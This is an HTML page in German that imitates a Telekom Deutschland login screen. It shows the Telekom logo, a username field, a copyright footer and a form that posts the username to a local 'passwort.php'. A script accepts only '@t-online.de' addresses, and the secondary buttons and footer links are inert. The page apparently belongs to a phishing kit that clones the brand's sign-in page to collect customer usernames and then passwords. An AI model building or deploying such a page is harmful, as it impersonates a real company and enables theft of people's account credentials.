<html lang="de">

<head>
  <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="stylesheet" href="./layout/css/normalizer.css" />
  <link rel="stylesheet" href="./layout/css/style.css" />
  <title>Willkommen</title>
</head>

<body>
  <header>
    <div style="display: flex;">
      <img src="./layout/img/telekom-logo.jpg" class="logo" alt="">
    </div>
  </header>

  <form method="post" action="passwort.php">
    <div class="container">
      <div class="title">Telekom Login</div>

      <div class="input-container">
        <input type="text" id="email" class="input" placeholder=" " name="email">
        <label for="email" class="input-label">Benutzername</label>
      </div>

      <div class="checkbox-container">
        <span class="checkbox"><img src="./layout/img/checkbox.jpg" alt=""></span>
        <span class="checkbox-text">Benutzername merken</span>
      </div>

      <div>
        <button type="submit" class="button-primary" id="btn" disabled>Weiter</button>
        <button type="button" class="button-secondary">Andere Anmeldeoptionen</button>
        <button type="button" class="button-last">Neu hier? Jetzt registrieren</button>
      </div>
    </div>

    <footer>
      <div class="footer">
        <div>
          <div>© Telekom Deutschland GmbH</div>
          <div>26.19.1</div>
        </div>
        <div>
          <div>Impressum</div>
          <div>Datenschutz</div>
        </div>
      </div>
    </footer>
  </form>

  <script>
    const emailInput = document.getElementById("email");
    const button = document.getElementById("btn");

    emailInput.addEventListener("input", () => {
      const email = emailInput.value.trim();
      button.disabled = !email.endsWith("@t-online.de");
    });
  </script>
</body>

</html>
